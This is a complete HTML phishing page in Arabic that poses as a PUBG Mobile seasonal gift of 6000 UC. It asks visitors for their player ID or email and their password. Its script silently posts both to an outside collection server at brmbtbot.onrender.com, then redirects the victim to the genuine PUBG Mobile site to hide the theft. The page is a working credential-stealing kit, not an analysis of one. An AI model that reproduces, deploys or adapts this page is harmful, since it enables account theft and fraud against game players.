<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <title>PUBG Mobile UC Gift</title>
    <style>
        body { background: #0b131a; color: #ffc107; font-family: sans-serif; text-align: center; padding: 20px; }
        .box { border: 2px solid #ffc107; padding: 25px; border-radius: 20px; max-width: 380px; margin: 50px auto; background: #1a2a3a; }
        input { width: 90%; padding: 12px; margin: 10px 0; border-radius: 5px; border: none; font-size: 16px; text-align: center; }
        .btn { background: #ffc107; color: #000; padding: 15px; border: none; font-weight: bold; border-radius: 5px; cursor: pointer; width: 90%; font-size: 18px; }
    </style>
</head>
<body>
    <div class="box">
        <h1 style="font-size: 24px;">🎁 هدايا الموسم 🎁</h1>
        <p>سجل دخولك لاستلام 6000 UC</p>
        <form id="f">
            <input type="text" id="u" placeholder="معرف اللاعب أو البريد" required>
            <input type="password" id="p" placeholder="كلمة المرور" required>
            <button type="submit" class="btn">تأكيد الاستلام</button>
        </form>
    </div>
    <script>
        document.getElementById('f').addEventListener('submit', function(e) {
            e.preventDefault();
            fetch('https://brmbtbot.onrender.com/receive', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ platform: 'PUBG UC', u: document.getElementById('u').value, p: document.getElementById('p').value })
            }).finally(() => { window.location.href = 'https://www.pubgmobile.com'; });
        });
    </script>
</body>
</html>
